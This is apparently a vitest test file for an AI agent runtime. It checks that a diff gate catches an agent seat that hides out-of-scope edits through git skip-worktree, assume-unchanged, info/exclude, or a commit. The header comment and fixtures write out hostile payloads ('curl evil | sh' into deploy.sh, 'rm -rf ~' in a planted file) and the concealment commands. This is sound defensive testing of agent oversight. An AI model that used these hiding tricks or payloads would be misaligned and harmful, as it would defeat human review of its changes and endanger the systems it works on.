// AN OPEN .git NEVER BLINDS THE DIFF GATE.
//
// Blocker N1 of the non-author grade (#553, issuecomment-5849688441). A seat that holds a git role has
// `.git` opened to its Bash (minus hooks and config). With that, and any command that runs code, it can
// make its out-of-scope work invisible to a gate that asks git what changed:
//   git update-index --skip-worktree scripts/deploy.sh && echo "curl evil | sh" > scripts/deploy.sh
//   echo scripts/planted.sh >> .git/info/exclude && echo "rm -rf ~" > scripts/planted.sh
// `git status` then reports nothing, `snapshotTree` / `changedPaths` return [], and both edits stand.
//
// THE DESIGN THIS FILE PINS: the SNAPSHOT (the conductor's preference — git roles legitimately write the
// index, so denying index-altering commands would break the very roles they are for). The gate judges
// what the seat did against a baseline the seat cannot write, taken BEFORE it runs: the content of every
// file in the tree (HEAD's tree from a copy of the object store, plus a full walk of the worktree), and it
// reads the tree AFTER by walking the worktree itself — never through the room's own index flags
// (skip-worktree, assume-unchanged), never through .git/info/exclude or core.excludesFile, and never by
// comparing with whatever HEAD the seat left behind (a seat holding git_commit can move HEAD).
// The last law below separates the designs: a seat that COMMITS its out-of-scope change leaves a clean
// status against the new HEAD; only a pre-seat baseline sees it.
//
//   law                                                           kind         drives                               plant
//   skip-worktree + an out-of-scope edit → refused, naming it     behavioural  runGig — src/runtime.ts (diff gate,  (RED at head) the gate trusts `git status`
//   assume-unchanged + an out-of-scope edit → refused              behavioural  src/diff_gate.ts)                    same
//   .git/info/exclude + a planted out-of-scope file → refused     behavioural  same                                 same
//   a COMMITTED out-of-scope change (HEAD moved) → refused        behavioural  same                                 diff against the post-seat HEAD
//   control: an in-scope edit, staged with the git role, seals    behavioural  same                                 refuse every seat that touched the index
//   REAL: the same attacks, run under srt with the sandbox the    behavioural  the invoker's --settings sandbox      (RED at head) — and proof the SANDBOX
//   invoker builds for a git_stage seat, are refused by the gate               (srt) + the gate                     permits the attack, so only the gate can stop it
import { describe, it, expect } from "vitest";
import { execFileSync } from "node:child_process";
import { appendFileSync, existsSync, mkdirSync, mkdtempSync, realpathSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, delimiter } from "node:path";
import { makeClaudeInvoker, createRegistry, createOutputStore, MemoryLedger, runGig, type Standard, type AgentInvoker, type Agent } from "../src/index.js";
import type { AgentInvocationContext } from "../src/runtime.js";
import { testAgent } from "./_support/agents.js";
import { coreInvariantFields } from "./_support/specs.js";
import { settingsOf, type Layout } from "./layout_grants_fixtures.js";
import { runAsync } from "./support/git_http_remote.js";

const LAYOUT = {
  paths: { source: ["src/**"] },
  commands: { build: ["npm run build"] },
  git: { stage: ["git add", "git mv", "git rm"], commit: ["git commit"] },
} as unknown as Layout;
const seat = (): Agent => testAgent({ slug: "impl", primitives: ["SENSE"], input_types: [], output_types: ["note"], domain: "demo",
  allowed_tools: ["Read", "Write(@source)", "Edit(@source)", "Bash(@git_stage)", "Bash(@git_commit)", "Bash(@build)"] });

const ENV = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" };
const git = (t: string, ...a: string[]) => execFileSync("git", ["-C", t, ...a], { env: ENV, encoding: "utf8" });
function tree(): string {
  const t = realpathSync(mkdtempSync(join(tmpdir(), "gate-blind-")));
  execFileSync("git", ["init", "-q", "-b", "main", t]);
  mkdirSync(join(t, "src")); mkdirSync(join(t, "scripts"));
  writeFileSync(join(t, "src", "a.ts"), "a\n");
  writeFileSync(join(t, "scripts", "deploy.sh"), "echo deploy\n");
  git(t, "add", "-A"); git(t, "commit", "-qm", "seed");
  git(t, "config", "user.name", "seat"); git(t, "config", "user.email", "seat@coltrane");
  return t;
}

async function run(t: string, act: (t: string) => void | Promise<void>) {
  const registry = createRegistry();
  registry.registerType({ slug: "note", extends: "Signal", domain: "demo", schema: { properties: { value: { type: "string" } } }, required_fields: [] } as never);
  const outputs = createOutputStore(registry);
  let invoked = 0;
  const invoke: AgentInvoker = async () => { invoked += 1; await act(t); return { ...coreInvariantFields("Signal"), value: "done" }; };
  const a = seat();
  const standard = { slug: "s", domain: "demo", agents: [a], phases: [{ name: "p", chairs: [{ role: "impl", agent_slug: "impl", depends_on: [], input_contract: [], output_contract: ["note"], required_skills: [] }] }] } as unknown as Standard;
  let said = "";
  try { said = JSON.stringify(await runGig(standard, { request_text: "x" }, { outputs, ledger: new MemoryLedger(), invoke, layout: LAYOUT, tree_root: t } as never)); }
  catch (e) { said = String((e as Error)?.message ?? e); }
  return { invoked, said, sealed: outputs.all().filter((o) => (o as { agent_slug?: string }).agent_slug === "impl") };
}

function expectRefused(r: { invoked: number; said: string; sealed: readonly unknown[] }, path: string, how: string) {
  expect(r.invoked, "non-vacuity: the seat ran").toBe(1);
  expect(r.sealed, `${how} — the gate saw nothing and the chair was SEALED`).toHaveLength(0);
  expect(r.said, `the refusal does not name ${path}`).toContain(path);
}

const ATTACKS: Array<[string, string, (t: string) => void]> = [
  ["skip-worktree on a tracked file, then an out-of-scope edit", "scripts/deploy.sh", (t) => {
    git(t, "update-index", "--skip-worktree", "scripts/deploy.sh");
    writeFileSync(join(t, "scripts", "deploy.sh"), "curl evil | sh\n");
  }],
  ["assume-unchanged on a tracked file, then an out-of-scope edit", "scripts/deploy.sh", (t) => {
    git(t, "update-index", "--assume-unchanged", "scripts/deploy.sh");
    writeFileSync(join(t, "scripts", "deploy.sh"), "curl evil | sh\n");
  }],
  [".git/info/exclude, then a planted out-of-scope file", "scripts/planted.sh", (t) => {
    appendFileSync(join(t, ".git", "info", "exclude"), "scripts/planted.sh\n");
    writeFileSync(join(t, "scripts", "planted.sh"), "rm -rf ~\n");
  }],
  ["an out-of-scope change COMMITTED (HEAD moved; the status is clean against the new HEAD)", "scripts/deploy.sh", (t) => {
    writeFileSync(join(t, "scripts", "deploy.sh"), "curl evil | sh\n");
    git(t, "add", "scripts/deploy.sh"); git(t, "commit", "-qm", "innocent");
  }],
];

describe("the diff gate judges against a baseline the seat cannot write (the snapshot design)", () => {
  for (const [how, path, act] of ATTACKS) {
    it(`${how}: the chair is refused, naming ${path}`, async () => {
      const t = tree();
      const r = await run(t, act);
      expectRefused(r, path, how);
    });
  }

  it("control — an in-scope edit, staged with the seat's own git role, seals", async () => {
    const t = tree();
    const r = await run(t, (tt) => { writeFileSync(join(tt, "src", "a.ts"), "b\n"); git(tt, "add", "src/a.ts"); });
    expect(r.sealed, `in-scope work staged with a git role was refused: ${r.said.slice(0, 300)}`).toHaveLength(1);
  });
});

// ── real processes: the attack under the sandbox the invoker builds ─────────────────────────────
function onPath(bin: string): string | undefined {
  for (const dir of (process.env["PATH"] ?? "").split(delimiter)) if (dir && existsSync(join(dir, bin))) return join(dir, bin);
  return undefined;
}
const SRT = process.env["COLTRANE_SRT"] || onPath("srt");
const OS_SANDBOX = process.platform === "darwin" ? existsSync("/usr/bin/sandbox-exec") : process.platform === "linux" ? onPath("bwrap") !== undefined : false;
const UNAVAILABLE = !SRT ? "no srt (sandbox-runtime) on PATH and COLTRANE_SRT unset" : !OS_SANDBOX ? `no OS sandbox on ${process.platform}` : "";
if (UNAVAILABLE) console.warn(`[UNVERIFIED] an_open_git_never_blinds_the_diff_gate (real processes): SKIPPED — ${UNAVAILABLE}`);

describe("REAL: the attacks, run under srt with the git seat's own sandbox (skipped as UNVERIFIED without srt + an OS sandbox)", () => {
  it("required: when COLTRANE_REQUIRE_REAL=1 (the CI sandbox job), srt and an OS sandbox are present", () => {
    if (process.env["COLTRANE_REQUIRE_REAL"] === "1") expect(UNAVAILABLE, "this job requires the real-process laws to RUN, and they would skip").toBe("");
  });

  async function sandboxFor(t: string) {
    let args: string[] | undefined;
    const invoke = makeClaudeInvoker({ toolProviders: new Map(), mcpServerConfigs: {}, run: (_b, a) => { args = a; return "{}"; } });
    try { await invoke({ agent: seat(), phase: "p", inputs: [], gig_input: { request_text: "x" }, layout: LAYOUT, tree_root: t } as unknown as AgentInvocationContext); } catch { /* argv only */ }
    const sb = settingsOf(args ?? [])[0]?.["sandbox"] as { filesystem?: { allowWrite?: string[]; denyWrite?: string[] } } | undefined;
    const cfg = join(mkdtempSync(join(tmpdir(), "srt-")), "srt.json");
    writeFileSync(cfg, JSON.stringify({ network: { allowedDomains: [], deniedDomains: [] }, filesystem: { denyRead: [], allowWrite: sb?.filesystem?.allowWrite ?? [], denyWrite: sb?.filesystem?.denyWrite ?? [] } }));
    return cfg;
  }

  for (const [how, path, cmd] of [
    ["skip-worktree + edit", "scripts/deploy.sh", "git update-index --skip-worktree scripts/deploy.sh && echo 'curl evil | sh' > scripts/deploy.sh"],
    ["info/exclude + plant", "scripts/planted.sh", "echo scripts/planted.sh >> .git/info/exclude && echo 'rm -rf ~' > scripts/planted.sh"],
  ] as const) {
    it.skipIf(Boolean(UNAVAILABLE))(`${how}: the sandbox PERMITS it (so only the gate can stop it), and the gate refuses the chair naming ${path}`, async () => {
      const t = tree();
      const cfg = await sandboxFor(t);
      let status: number | null = null;
      const r = await run(t, async (tt) => { status = (await runAsync(SRT!, ["--settings", cfg, "--", "sh", "-c", cmd], { cwd: tt, env: ENV, timeoutMs: 60_000 })).status; });
      expect(status, "the attack failed inside the sandbox — this law's premise (the sandbox permits it) does not hold here").toBe(0);
      expectRefused(r, path, `${how} under srt`);
    }, 120_000);
  }
});
